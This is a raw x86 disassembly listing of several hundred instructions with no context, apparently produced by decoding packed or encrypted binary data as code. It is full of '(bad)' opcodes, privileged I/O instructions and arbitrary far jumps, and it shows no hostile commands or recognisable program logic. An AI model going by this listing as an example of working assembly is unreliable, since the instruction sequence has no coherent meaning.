  41dbec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dbed:	xchg   esi,eax
  41dbee:	dec    esp
  41dbef:	cwde   
  41dbf0:	pop    ds
  41dbf1:	adc    BYTE PTR [ebx-0x694ea47b],0x78
  41dbf8:	bound  edi,QWORD PTR [ebx]
  41dbfa:	int    0xb6
  41dbfc:	jecxz  0x41dc1b
  41dbfe:	es leave 
  41dc00:	mov    esi,0xfa6ca3bd
  41dc05:	and    DWORD PTR [ebp-0x4bcbc3fa],edx
  41dc0b:	sub    dh,BYTE PTR [ebp+0x59]
  41dc0e:	int3   
  41dc0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dc10:	and    eax,0xa2d16b2a
  41dc15:	xchg   edi,eax
  41dc16:	push   edx
  41dc17:	stos   DWORD PTR es:[edi],eax
  41dc18:	idiv   DWORD PTR [ebp+0x74]
  41dc1b:	pop    edi
  41dc1c:	fimul  DWORD PTR [ebp-0x1]
  41dc1f:	mov    al,0x73
  41dc21:	ins    DWORD PTR es:[edi],dx
  41dc22:	xchg   DWORD PTR [edi],ebx
  41dc24:	pop    esp
  41dc25:	sub    eax,DWORD PTR [ecx+0x576835e3]
  41dc2b:	imul   ecx,DWORD PTR [ebx-0x6b],0x958bfe20
  41dc32:	shl    BYTE PTR [edi],0x46
  41dc35:	jno    0x41dbda
  41dc37:	aad    0x35
  41dc39:	push   ecx
  41dc3a:	add    ecx,ebx
  41dc3c:	mov    eax,0xa24088dd
  41dc41:	xor    BYTE PTR [edx-0x1fad9d08],dl
  41dc47:	test   bh,cl
  41dc49:	je     0x41dc46
  41dc4b:	jle    0x41dc2d
  41dc4d:	lock sbb al,0xdc
  41dc50:	sub    DWORD PTR [esi],ebx
  41dc52:	daa    
  41dc53:	movaps XMMWORD PTR [esi-0x63],xmm3
  41dc57:	mov    cl,0xac
  41dc59:	add    eax,0x4cc7ba1a
  41dc5e:	lds    ecx,FWORD PTR [edx]
  41dc60:	pop    es
  41dc61:	ins    BYTE PTR es:[edi],dx
  41dc62:	dec    ebx
  41dc63:	lods   eax,DWORD PTR ds:[esi]
  41dc64:	out    dx,eax
  41dc65:	lea    edx,[ecx-0x53]
  41dc68:	mov    dl,BYTE PTR [ebp-0x33]
  41dc6b:	adc    esp,DWORD PTR [ebx-0x1d]
  41dc6e:	sub    bh,ah
  41dc70:	test   al,0x2
  41dc72:	and    esi,0x71224a42
  41dc78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dc79:	rol    BYTE PTR [edi+0x388a62a7],0xbd
  41dc80:	pop    ds
  41dc81:	add    bh,cl
  41dc83:	scas   al,BYTE PTR es:[edi]
  41dc84:	or     eax,0x272081ab
  41dc89:	jnp    0x41dc94
  41dc8b:	or     dh,bl
  41dc8d:	jae    0x41dcb4
  41dc8f:	inc    ebx
  41dc90:	mov    ecx,DWORD PTR [esp+eax*8-0x52]
  41dc94:	mov    edx,0x68f95370
  41dc99:	adc    BYTE PTR [ebp-0x32],0xb2
  41dc9d:	inc    ecx
  41dc9e:	mov    dh,0xe9
  41dca0:	xchg   ecx,eax
  41dca1:	push   esp
  41dca2:	pop    eax
  41dca3:	push   ds
  41dca4:	xchg   edx,eax
  41dca5:	(bad)  
  41dca6:	mov    ds:0x3069f38c,eax
  41dcab:	sub    BYTE PTR [edx+eiz*1+0x2e],0x48
  41dcb0:	add    DWORD PTR [edx+0x193c262d],0xffffffa2
  41dcb7:	xchg   esi,eax
  41dcb8:	(bad)  
  41dcb9:	out    dx,eax
  41dcba:	popf   
  41dcbb:	(bad)  
  41dcbc:	aaa    
  41dcbd:	jmp    0x207898bd
  41dcc2:	in     al,0x10
  41dcc4:	mov    edx,0x807d885b
  41dcc9:	dec    ebp
  41dcca:	(bad)  
  41dccc:	rcl    DWORD PTR [edx+0x5b584012],0x2f
  41dcd3:	push   0x7da38885
  41dcd8:	mov    eax,0x4090fc4e
  41dcdd:	stc    
  41dcde:	or     ecx,DWORD PTR [ebp+0x69853229]
  41dce4:	gs xchg edx,eax
  41dce6:	(bad)
  41dce9:	std    
  41dcea:	outs   dx,DWORD PTR ds:[esi]
  41dceb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcec:	pop    esi
  41dced:	jb     0x41dd28
  41dcef:	ja     0x41dcd4
  41dcf1:	add    esi,DWORD PTR [edx+0x2f628c07]
  41dcf7:	pusha  
  41dcf8:	add    BYTE PTR [ecx-0x4c],bl
  41dcfb:	adc    ah,cl
  41dcfd:	idiv   DWORD PTR [esi]
  41dcff:	sbb    bl,BYTE PTR [esi]
  41dd01:	mov    dl,0x0
  41dd03:	fistp  QWORD PTR [ebp-0x3e803a42]
  41dd09:	aad    0x48
  41dd0b:	rcl    BYTE PTR [ebx+0x2b362ad2],0xc2
  41dd12:	test   eax,0x79ee216c
  41dd17:	jp     0x41dcef
  41dd19:	fwait
  41dd1a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dd1b:	ds mov bl,0x3c
  41dd1e:	(bad)  
  41dd1f:	cmp    eax,0x61c8a6e1
  41dd24:	jg     0x41dd12
  41dd26:	(bad)  
  41dd27:	and    BYTE PTR gs:[eax+0x50],ah
  41dd2b:	iret   
  41dd2c:	dec    ebp
  41dd2d:	xchg   edi,eax
  41dd2e:	repnz push cs
  41dd30:	add    DWORD PTR [edi],ebx
  41dd32:	cmp    eax,0xe5f02f09
  41dd37:	xchg   esp,eax
  41dd38:	lock call 0xe43d280b
  41dd3e:	adc    dl,BYTE PTR ds:[edx]
  41dd41:	loopne 0x41dd10
  41dd43:	cs out 0x52,al
  41dd46:	adc    eax,0x9bb72a5
  41dd4b:	cmp    bl,BYTE PTR [eax-0x2af8b5af]
  41dd51:	mov    BYTE PTR [edx],dh
  41dd53:	jb     0x41ddce
  41dd55:	cld    
  41dd56:	mov    eax,ds:0x94bb2f30
  41dd5b:	loopne 0x41dd71
  41dd5d:	cld    
  41dd5e:	les    ebp,FWORD PTR [eax-0xb7c65cc]
  41dd64:	dec    ecx
  41dd65:	pop    ecx
  41dd66:	xor    cl,BYTE PTR [eax-0x7613c63c]
  41dd6c:	dec    edx
  41dd6d:	js     0x41dde5
  41dd6f:	icebp  
  41dd70:	xchg   esi,eax
  41dd71:	lds    ebx,FWORD PTR [ebp+ecx*2-0x5af5d9e7]
  41dd78:	stc    
  41dd79:	xchg   edx,eax
  41dd7a:	cmp    esp,DWORD PTR [ebp-0x2]
  41dd7d:	lock leave 
  41dd7f:	int3   
  41dd80:	stos   DWORD PTR es:[edi],eax
  41dd81:	inc    esi
  41dd82:	jb     0x41dd4c
  41dd84:	shl    DWORD PTR [edi],cl
  41dd86:	mov    ds:0x6f82f0a0,al
  41dd8b:	mov    esp,DWORD PTR [ebp+0x7a]
  41dd8e:	jmp    0x41dda5
  41dd90:	(bad)  
  41dd92:	sbb    ch,ch
  41dd94:	cs in  al,dx
  41dd96:	jno    0x41dd3c
  41dd98:	repnz outs dx,DWORD PTR ds:[esi]
  41dd9a:	(bad)  
  41dd9c:	cs das 
  41dd9e:	jo     0x41dd33
  41dda0:	adc    eax,0xbe1846eb
  41dda5:	xor    al,0x73
  41dda7:	sar    BYTE PTR [ebx+esi*1-0x19],0xe0
  41ddac:	sub    DWORD PTR [edi-0x31],0x5f021cfc
  41ddb3:	mov    ah,BYTE PTR [ebx+edx*4+0x20]
  41ddb7:	mov    bh,0xf
  41ddb9:	ror    dl,1
  41ddbb:	cld    
  41ddbc:	dec    esi
  41ddbd:	inc    ebp
  41ddbe:	mov    al,BYTE PTR [ebx-0x2909f7f7]
  41ddc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ddc5:	adc    esi,eax
  41ddc7:	mov    esi,0x5fd59b0c
  41ddcc:	fisubr DWORD PTR [esi]
  41ddce:	inc    ebx
  41ddcf:	shr    eax,0x9
  41ddd2:	pop    ds
  41ddd3:	xchg   BYTE PTR [edi-0x7d772a35],ch
  41ddd9:	push   esp
  41ddda:	cdq    
  41dddb:	sbb    DWORD PTR [ebp+0xc],esi
  41ddde:	xor    al,0x41
  41dde0:	mov    dh,0x98
  41dde2:	call   0xdd68e157
  41dde7:	ficomp DWORD PTR [eax]
  41dde9:	xor    al,BYTE PTR [edx+0x56]
  41ddec:	(bad)  
  41dded:	cld    
  41ddee:	outs   dx,DWORD PTR ds:[esi]
  41ddef:	sub    DWORD PTR [ecx+0xa2d35b],esp
  41ddf5:	imul   esi,DWORD PTR [eax+0x2e],0xffffffb1
  41ddf9:	sbb    al,0x9b
  41ddfb:	pop    es
  41ddfc:	stos   BYTE PTR es:[edi],al
  41ddfd:	addr16 xchg esp,eax
  41ddff:	mov    esp,0xda60e8b6
  41de04:	imul   esi,DWORD PTR [eax-0x7e],0x41
  41de08:	xchg   ebp,eax
  41de09:	pop    edx
  41de0a:	nop
  41de0b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41de0c:	jge    0x41de0e
  41de0e:	xor    ebp,ebp
  41de10:	out    dx,eax
  41de11:	ins    DWORD PTR es:[edi],dx
  41de12:	cmp    esp,esp
  41de14:	sahf   
  41de15:	and    DWORD PTR [ecx],0xffffffd6
  41de18:	lods   eax,DWORD PTR ds:[esi]
  41de19:	push   ebp
  41de1a:	mov    ebp,0x42cb6fd2
  41de1f:	outs   dx,BYTE PTR ds:[esi]
  41de20:	and    DWORD PTR [ebx-0x5c9717a5],ecx
  41de26:	(bad)  
  41de27:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de28:	aaa    
  41de29:	out    0x44,eax
  41de2b:	fidivr WORD PTR ss:[eax+ebp*2+0x35]
  41de30:	test   BYTE PTR ds:0x13fa0f3c,ch
  41de36:	pop    ecx
  41de37:	leave  
  41de38:	xchg   ebp,eax
  41de39:	mov    eax,ds:0xfda0decc
  41de3e:	aad    0xd0
  41de40:	cdq    
  41de41:	sbb    al,0xf6
  41de43:	ja     0x41de7d
  41de45:	int3   
  41de46:	or     eax,0xf125f9f4
  41de4b:	hlt    
  41de4c:	mov    edi,0xfd3ba7ae
  41de51:	xchg   ebp,eax
  41de52:	push   0x22
  41de54:	and    BYTE PTR [esp+edx*1],al
  41de57:	xchg   esi,eax
  41de58:	xchg   ebx,eax
  41de59:	add    BYTE PTR [eax+eiz*4-0x6d],dl
  41de5d:	inc    ebp
  41de5e:	lock and DWORD PTR [ecx-0x1011729b],ecx
  41de65:	pop    ebx
  41de66:	xchg   DWORD PTR [ebp-0x5c91a5f4],esp
  41de6c:	aaa    
  41de6d:	call   0xe0d158b8
  41de72:	jl     0x41de25
  41de74:	(bad)  
  41de75:	stos   DWORD PTR es:[edi],eax
  41de76:	mov    eax,0x20284771
  41de7b:	jmp    0x168f0369
  41de80:	js     0x41de28
  41de82:	dec    esp
  41de83:	cmp    al,0x7
  41de85:	inc    ecx
  41de86:	cmp    ah,BYTE PTR [edi+0xc4c99b4]
  41de8c:	xchg   ebx,eax
  41de8d:	imul   ebx,DWORD PTR [ebx],0x4fc6f2af
  41de93:	mov    gs,edi
  41de95:	dec    ebx
  41de96:	push   ss
  41de97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de98:	pop    edi
  41de99:	mov    ebx,eax
  41de9b:	rcl    ebp,cl
  41de9d:	fimul  DWORD PTR [edi+ecx*8]
  41dea0:	sub    al,0xda
  41dea2:	in     al,0x92
  41dea4:	aas    
  41dea5:	push   ecx
  41dea6:	fild   WORD PTR [ecx+0x3d]
  41dea9:	nop
  41deaa:	sub    BYTE PTR [ebx+edi*2],0x1f
  41deae:	jmp    0x76dce1e5
  41deb3:	stc    
  41deb4:	mov    ebp,0xc4f6e829
  41deb9:	shl    DWORD PTR [esi],cl
  41debb:	push   ecx
  41debc:	adc    edi,0x35
  41debf:	test   bh,0x7c
  41dec2:	dec    edx
  41dec3:	aaa    
  41dec4:	mov    ebp,0xafbd19b5
  41dec9:	popf   
  41deca:	in     eax,dx
  41decb:	out    0x88,al
  41decd:	mov    cl,0x36
  41decf:	imul   ebx,DWORD PTR [edi],0x1a
  41ded2:	or     ebp,DWORD PTR [ecx-0x73169adb]
  41ded8:	mov    bl,0x38
  41deda:	pushf  
  41dedb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dedc:	inc    BYTE PTR [ebx+0x1e286d51]
  41dee2:	daa    
  41dee3:	jecxz  0x41df05
  41dee5:	add    dl,dl
  41dee7:	sbb    BYTE PTR [edi],ch
  41dee9:	or     dh,BYTE PTR [ebx]
  41deeb:	push   esi
  41deec:	sbb    al,0xb5
  41deee:	inc    ecx
  41deef:	jae    0x41de83
  41def1:	and    DWORD PTR [ecx+0x42f95a44],0xe33b41b3
  41defb:	push   ebp
  41defc:	imul   ecx,esi,0xffffffab
  41deff:	add    esp,DWORD PTR [edx-0x1b]
  41df02:	xor    al,0xe1
  41df04:	xor    al,0x8
  41df06:	lock pushf 
  41df08:	push   ecx
  41df09:	push   0xffffffb2
  41df0b:	push   esi
  41df0c:	jmp    0x578f:0x652af5cb
  41df13:	inc    edx
  41df14:	xor    eax,0xe0159eb
  41df19:	add    BYTE PTR [edx+0x3a1ccd7],bl
  41df1f:	ret    0x27da
  41df22:	(bad)  
  41df23:	sub    al,0x73
  41df25:	dec    ebx
  41df26:	inc    BYTE PTR [ebx]
  41df28:	fwait
  41df29:	xchg   DWORD PTR [ebx],ecx
  41df2b:	add    al,0xf7
  41df2d:	dec    ecx
  41df2e:	js     0x41df26
  41df30:	es inc esi
  41df32:	mov    ebp,0x64513045
  41df37:	adc    esp,DWORD PTR [esi+0x6a]
  41df3a:	scas   eax,DWORD PTR es:[edi]
  41df3b:	push   cs
  41df3c:	ret    
  41df3d:	lahf   
  41df3e:	inc    ebp
  41df3f:	jp     0x41dfa9
  41df41:	mov    al,ds:0x71d70077
  41df46:	mov    esp,0x1a4e8818
  41df4b:	xor    eax,0x1d50842a
  41df50:	push   ss
  41df51:	xor    BYTE PTR [esi+0x20],ah
  41df54:	mov    dl,0xda
  41df56:	icebp  
  41df57:	outs   dx,BYTE PTR ds:[esi]
  41df58:	and    al,0xd6
  41df5a:	retf   0x4d99
  41df5d:	shl    ebx,1
  41df5f:	data16 stc 
  41df61:	xchg   esp,eax
  41df62:	rep gs ins BYTE PTR es:[edi],dx
  41df65:	xchg   DWORD PTR [edx-0xce1119],eax
  41df6b:	add    ch,BYTE PTR [ecx-0x47]
  41df6e:	(bad)  
  41df6f:	cmp    al,0xfb
  41df71:	mov    edx,0xf3dec2d4
  41df76:	push   ds
  41df77:	cmp    cl,BYTE PTR [ebx-0x7c]
  41df7a:	in     eax,dx
  41df7b:	dec    edx
  41df7c:	cmp    al,0xe9
  41df7e:	mov    ah,dh
  41df80:	dec    edi
  41df81:	inc    esi
  41df82:	cmp    eax,0x3
  41df85:	cmp    BYTE PTR [ecx-0x6b],ch
  41df88:	out    dx,al
  41df89:	add    eax,0x727d665f
  41df8e:	mov    BYTE PTR [ebx],cl
  41df90:	jno    0x41df9a
  41df92:	ret    0x82af
  41df95:	cli    
  41df96:	adc    ch,ch
  41df98:	jg     0x41df25
  41df9a:	lods   eax,DWORD PTR ds:[esi]
  41df9b:	cld    
  41df9c:	mov    bl,0x1a
  41df9e:	xor    edi,edi
  41dfa0:	icebp  
  41dfa1:	outs   dx,DWORD PTR ds:[esi]
  41dfa2:	(bad)  
  41dfa3:	mov    WORD PTR ds:0xb82c4fa9,es
  41dfa9:	mov    esi,0xeedb67f
  41dfaf:	mov    ecx,0x55356609
  41dfb4:	icebp  
  41dfb5:	jno    0x41df43
  41dfb7:	push   ebp
  41dfb8:	es ins DWORD PTR es:[edi],dx
  41dfba:	push   ebx
  41dfbb:	xchg   esp,eax
  41dfbc:	inc    ebp
  41dfbd:	push   cs
  41dfbe:	popa   
  41dfbf:	pushf  
  41dfc0:	xor    bl,BYTE PTR [ecx-0x57]
  41dfc3:	xor    edi,0x35
  41dfc6:	clc    
  41dfc7:	push   ebp
  41dfc8:	xor    esi,DWORD PTR [eax-0x54]
  41dfcb:	adc    BYTE PTR [edi-0x71],bl
  41dfce:	dec    esp
  41dfcf:	(bad)  
  41dfd0:	and    al,BYTE PTR [ecx-0x5c]
  41dfd3:	call   0xa137:0x8726a171
  41dfda:	aas    
  41dfdb:	jg     0x41df6d
  41dfdd:	mov    dh,0xd1
  41dfdf:	or     dl,al
  41dfe1:	arpl   WORD PTR [esi+edx*8-0x5a],di
  41dfe5:	mov    ds:0xeb58c69c,eax
  41dfea:	retf   
  41dfeb:	xor    al,0x1
  41dfed:	mov    eax,ds:0x181a53e4
  41dff2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dff3:	aaa    
  41dff4:	out    dx,eax
  41dff5:	jnp    0x41dff3
  41dff7:	xchg   esi,eax
  41dff8:	jns    0x41dfdd
  41dffa:	add    DWORD PTR [eax],esi
  41dffc:	pop    edx
  41dffd:	imul   DWORD PTR [ebp-0x51]
  41e000:	outs   dx,DWORD PTR ds:[esi]
  41e001:	arpl   WORD PTR [esi],bx
  41e003:	stos   DWORD PTR es:[edi],eax
  41e004:	xchg   edx,eax
  41e005:	jnp    0x41e038
  41e007:	(bad)  
  41e009:	sub    eax,DWORD PTR [esi-0x22d43e12]
  41e00f:	pushf  
  41e010:	sbb    al,0xfa
  41e012:	dec    ebp
  41e013:	add    ebp,DWORD PTR [edx+0x5d]
  41e016:	(bad)  
  41e017:	jns    0x41e082
  41e019:	les    eax,FWORD PTR [ebp+0x5dfd3438]
  41e01f:	nop
  41e020:	retf   
  41e021:	pop    esi
  41e022:	stos   DWORD PTR es:[edi],eax
  41e023:	add    ecx,eax
  41e025:	int3   
  41e026:	xchg   esi,eax
  41e027:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e028:	test   al,0x85
  41e02a:	dec    ebp
  41e02b:	into   
  41e02c:	or     eax,0x8a158b55
  41e031:	jmp    0x19a5bdb0
  41e036:	or     esi,DWORD PTR [edi]
  41e038:	and    edi,DWORD PTR [edi-0x56]
  41e03b:	inc    eax
  41e03c:	sub    BYTE PTR [edx],0x7b
  41e03f:	call   0x143b:0xce7b1de3
  41e046:	gs retf 0x8df5
  41e04a:	fs popa 
  41e04c:	mov    al,0xe2
  41e04e:	xchg   ebp,eax
  41e04f:	mov    ecx,0xc54e0488
  41e054:	sahf   
  41e055:	adc    BYTE PTR [ecx+ebp*4+0x27],bh
  41e059:	stc    
  41e05a:	data16 faddp st(6),st
  41e05d:	mov    ch,0x99
  41e05f:	nop
  41e060:	jae    0x41e06d
  41e062:	nop
  41e063:	loopne 0x41e032
  41e065:	or     ch,BYTE PTR [esi-0x5cde386c]
  41e06b:	leave  
  41e06c:	retf   
  41e06d:	jo     0x41e06b
  41e06f:	je     0x41e037
  41e071:	dec    esi
  41e072:	fwait
  41e073:	mov    ebx,0x821482cd
  41e078:	adc    dh,BYTE PTR [eax+edx*2+0x48ca1ef2]
  41e07f:	dec    eax
  41e080:	stos   DWORD PTR es:[edi],eax
  41e081:	lods   eax,DWORD PTR ds:[esi]
  41e082:	(bad)  [ecx+0xf56b6c9]
  41e088:	mov    esi,0x501e58a4
  41e08d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e08e:	add    ecx,esi
  41e090:	mov    ebp,0x5a0444bd
  41e095:	mov    WORD PTR [edx+0x28],gs
  41e098:	or     BYTE PTR [ebx],dl
  41e09a:	rcl    bl,0x62
  41e09d:	push   ds
  41e09e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e09f:	xor    eax,0xb7fcee4f
  41e0a4:	jne    0x41e078
  41e0a6:	xor    ah,0x28
  41e0a9:	inc    ebp
  41e0aa:	inc    ecx
  41e0ab:	(bad)
  41e0af:	nop
  41e0b0:	shl    DWORD PTR [edi+0xdcb80e1],0x8c
  41e0b7:	inc    eax
  41e0b8:	cwde   
  41e0b9:	lods   al,BYTE PTR ds:[esi]
  41e0ba:	pop    ebx
  41e0bb:	mov    bh,0x40
  41e0bd:	push   esi
  41e0be:	xor    DWORD PTR [ebp+0x11071789],esi
  41e0c4:	ins    BYTE PTR es:[edi],dx
  41e0c5:	lds    esp,FWORD PTR [ebp+0x66]
  41e0c8:	sbb    ah,cl
  41e0ca:	daa    
  41e0cb:	sbb    al,0x86
  41e0cd:	(bad)  
  41e0ce:	(bad)  
  41e0d0:	inc    eax
  41e0d1:	mov    es,WORD PTR [eax]
  41e0d3:	popa   
  41e0d4:	push   edx
  41e0d5:	neg    BYTE PTR [ecx+edx*1]
  41e0d8:	mov    esp,0x21e06527
  41e0dd:	sti    
  41e0de:	ror    DWORD PTR ds:0xac144c26,0xba
  41e0e5:	outs   dx,BYTE PTR ds:[esi]
  41e0e6:	inc    esp
  41e0e7:	cmp    DWORD PTR [edi-0x5d59d854],0xdd1023b4
  41e0f1:	icebp  
  41e0f2:	xor    al,0xb0
  41e0f4:	and    BYTE PTR [eax+0x70dfc2c4],bl
  41e0fa:	loop   0x41e0d9
  41e0fc:	jns    0x41e0b4
  41e0fe:	xchg   edx,eax
  41e0ff:	sbb    DWORD PTR [ebx+0xd],esp
  41e102:	arpl   cx,ax
  41e104:	jl     0x41e0eb
  41e106:	add    al,0x46
  41e108:	pusha  
  41e109:	or     esp,DWORD PTR [esi]
  41e10b:	fld    TBYTE PTR [ebp+0x125292f4]
  41e111:	cwde   
  41e112:	mov    eax,0x11478372
  41e117:	jg     0x41e09b
  41e119:	mov    ebx,0x4b112407
  41e11e:	inc    edi
  41e11f:	out    dx,al
  41e120:	je     0x41e0ac
  41e122:	adc    bl,dh
  41e124:	ins    DWORD PTR es:[edi],dx
  41e125:	push   es
  41e126:	ret    
  41e127:	sub    ebp,DWORD PTR [eax]
  41e129:	popa   
  41e12a:	mov    ?,WORD PTR [edi-0x22]
  41e12d:	and    eax,0xdab202b
  41e132:	jno    0x41e0f8
  41e134:	das    
  41e135:	xor    dl,BYTE PTR [ecx+0x23]
  41e138:	cmp    ecx,DWORD PTR ds:0x8657b157
  41e13e:	adc    BYTE PTR [ebx-0x5a],dh
  41e141:	add    ah,bl
  41e143:	retf   
  41e144:	lods   al,BYTE PTR ds:[esi]
  41e145:	cmp    BYTE PTR [edi],bh
  41e147:	jmp    0xd7cbc18e
  41e14c:	adc    esi,ebp
  41e14e:	xor    ebp,edi
  41e150:	addr16 xor eax,0x6806400e
  41e156:	ss xchg esp,eax
  41e158:	lahf   
  41e159:	add    edi,DWORD PTR [esi]
  41e15b:	mov    edi,0x9a901bef
  41e160:	retf   0xdb2c
  41e163:	jge    0x41e0f5
  41e165:	clc    
  41e166:	int    0x61
  41e168:	ds or  al,0x4c
  41e16b:	in     eax,dx
  41e16c:	pop    ss
  41e16d:	(bad)  
  41e16e:	pop    edi
  41e16f:	dec    ebp
  41e170:	sbb    bl,BYTE PTR [edi-0x45]
  41e173:	sub    al,0x3
  41e175:	mov    ebp,DWORD PTR [edi-0x6f3d04cf]
  41e17b:	daa    
  41e17c:	sub    ch,BYTE PTR [ebx-0x77]
  41e17f:	mov    WORD PTR ds:0x390bc711,es
  41e185:	push   ebx
  41e186:	mov    ah,0x3c
  41e188:	rcr    DWORD PTR [ebx+ebx*2+0x45],0x37
  41e18d:	jb     0x41e1d6
  41e18f:	dec    esp
  41e190:	shl    DWORD PTR [edx],cl
  41e192:	cmp    DWORD PTR [ebx-0x6a1b8ecc],edx
  41e198:	out    dx,eax
  41e199:	sub    ch,BYTE PTR ds:0xe91adec7
  41e19f:	or     eax,0x81ac2729
  41e1a4:	and    esp,DWORD PTR [eax-0x66464723]
  41e1aa:	lock int 0x34
  41e1ad:	jae    0x41e151
  41e1af:	sub    al,0xfa
  41e1b1:	retf   0xce99
  41e1b4:	les    edx,FWORD PTR [ebp+0x22]
  41e1b7:	push   edx
  41e1b8:	(bad)  
  41e1ba:	mov    al,ds:0x7697198
  41e1bf:	test   ah,bl
  41e1c1:	add    ah,cl
  41e1c3:	jmp    0x41e1ef
  41e1c5:	ret    0x9f46
  41e1c8:	pop    ss
  41e1c9:	jno    0x41e19d
  41e1cb:	xchg   edi,esp
  41e1cd:	neg    BYTE PTR [edx+eiz*4]
  41e1d0:	xchg   ecx,eax
  41e1d1:	scas   al,BYTE PTR es:[edi]
  41e1d2:	repz sar BYTE PTR [ecx],1
  41e1d5:	fpatan 
  41e1d7:	pop    eax
  41e1d8:	sti    
  41e1d9:	or     al,0xd0
  41e1db:	xor    eax,0x48e25de1
  41e1e0:	das    
  41e1e1:	lock sbb BYTE PTR [edx+0x7],ch
  41e1e5:	jg     0x41e214
  41e1e7:	dec    ebx
  41e1e8:	jb     0x41e24a
  41e1ea:	xor    bh,BYTE PTR [ebx-0xa]
  41e1ed:	sbb    DWORD PTR [ebp-0x12],0xbd69cfee
  41e1f4:	scas   al,BYTE PTR es:[edi]
  41e1f5:	push   ebx
  41e1f6:	je     0x41e1c1
  41e1f8:	std    
  41e1f9:	sbb    dl,BYTE PTR [ebx+0x71ef71c1]
  41e1ff:	jl     0x41e199
  41e201:	outs   dx,DWORD PTR ds:[esi]
  41e202:	push   ebp
  41e204:	xlat   BYTE PTR ds:[ebx]
  41e205:	adc    DWORD PTR [eax+edx*8],edx
  41e208:	adc    cl,BYTE PTR [esi-0x5]
  41e20b:	enter  0x617,0xe
  41e20f:	dec    esp
  41e210:	mov    ah,0x5
  41e212:	mov    eax,ds:0x20e66284
  41e217:	ins    DWORD PTR es:[edi],dx
  41e218:	mov    ebx,0x99ac2349
  41e21d:	xchg   ecx,eax
  41e21e:	push   esi
  41e21f:	loop   0x41e1f7
  41e221:	sub    al,0x76
  41e223:	clc    
  41e224:	dec    esp
  41e225:	and    BYTE PTR [edx],0x44
  41e228:	mov    DWORD PTR [eax+0x64],ebp
  41e22b:	imul   esi,DWORD PTR [eax+edi*2-0x6d],0x4c96101a
  41e233:	inc    edi
  41e234:	mul    DWORD PTR [eax-0x57f0b0b5]
  41e23a:	cmp    al,0xdf
  41e23c:	outs   dx,BYTE PTR ds:[esi]
  41e23d:	add    esi,DWORD PTR [edi+0x15c252b8]
  41e243:	repz fist DWORD PTR [ebx+0x5547bf6b]
  41e24a:	out    0x71,al
  41e24c:	push   0xffffffd8
  41e24e:	ret    0x29c2
  41e251:	lods   al,BYTE PTR ds:[esi]
  41e252:	shl    DWORD PTR [ebp+0x22],0xb3
  41e256:	rcr    BYTE PTR [esi+0x2b],cl
  41e259:	(bad)  
  41e25a:	fisubr WORD PTR [eax-0x18]
  41e25d:	push   eax
  41e25e:	pop    ds
  41e25f:	(bad)  
  41e260:	fist   WORD PTR [ebp-0x4e]
  41e263:	fnstenv [edx-0x64]
  41e266:	hlt    
  41e267:	outs   dx,DWORD PTR ds:[esi]
  41e268:	pusha  
  41e269:	imul   esi,DWORD PTR [ebp+ebp*4-0x77],0x45
  41e26e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e26f:	inc    ecx
  41e270:	jns    0x41e211
  41e272:	repnz pop edx
  41e274:	xor    ebx,DWORD PTR [edi]
  41e276:	push   ebp
  41e277:	test   eax,0x94f73c8c
  41e27c:	je     0x41e2f1
  41e27e:	bound  ecx,QWORD PTR [ebx-0x77e5be58]
  41e284:	sbb    cl,ah
  41e286:	and    dh,BYTE PTR cs:[ebp-0x4b616bd0]
  41e28d:	xchg   esi,eax
  41e28e:	cli    
  41e28f:	push   esi
  41e290:	cdq    
  41e291:	int3   
  41e292:	add    edi,ebp
  41e294:	cmc    
  41e295:	out    0xc0,al
  41e297:	shl    esp,cl
  41e299:	imul   esp,DWORD PTR [ebx+0x5002188e],0xb5d5411e
  41e2a3:	lock cli 
  41e2a5:	push   ebx
  41e2a6:	dec    eax
  41e2a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e2a8:	setns  ch
  41e2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e2ac:	mov    WORD PTR [eax+ebp*4+0x1d19798c],cs
  41e2b3:	sbb    DWORD PTR [ebx-0x7c],esi
  41e2b6:	sub    DWORD PTR [edi-0x77],0xa28697d9
  41e2bd:	and    ah,BYTE PTR [eax+0x3c]
  41e2c0:	push   ebp
  41e2c1:	push   esp
  41e2c2:	and    al,0x18
  41e2c4:	imul   eax,DWORD PTR [ecx-0x6d55cd7b],0x845080d7
  41e2ce:	nop
  41e2cf:	jnp    0x41e2de
  41e2d1:	xchg   DWORD PTR [ecx+0x53fa2723],esi
  41e2d7:	or     DWORD PTR [eax-0x5149a4ba],ebp
  41e2dd:	pusha  
  41e2de:	push   cs
  41e2df:	inc    ebx
  41e2e0:	push   edi
  41e2e1:	pop    ss
  41e2e2:	xchg   esi,eax
  41e2e3:	shr    BYTE PTR [edi-0x40b54872],0xab
  41e2ea:	or     DWORD PTR [edx+ecx*1],0x34
  41e2ee:	cdq    
  41e2ef:	mov    eax,0x39f623cd
  41e2f4:	jmp    0xa76d:0x2844f988
  41e2fb:	mov    ebp,eax
  41e2fd:	adc    ecx,ebp
  41e2ff:	jns    0x41e345
  41e301:	(bad)  
  41e302:	xor    eax,0x2abb8f2a
  41e307:	or     edi,DWORD PTR [eax+ebx*4]
  41e30a:	jbe    0x41e33f
  41e30c:	add    al,0x67
  41e30e:	imul   esi,DWORD PTR [edx+0x77],0xd5a455a
  41e315:	dec    edi
  41e316:	shr    DWORD PTR [edx],1
  41e318:	stc    
  41e319:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e31a:	ret    
  41e31b:	add    eax,0xd6cadd34
  41e320:	add    ch,BYTE PTR [ebx+edx*2-0x22]
  41e324:	lock mov ah,0x1e
  41e327:	aam    0x5
  41e329:	pop    esp
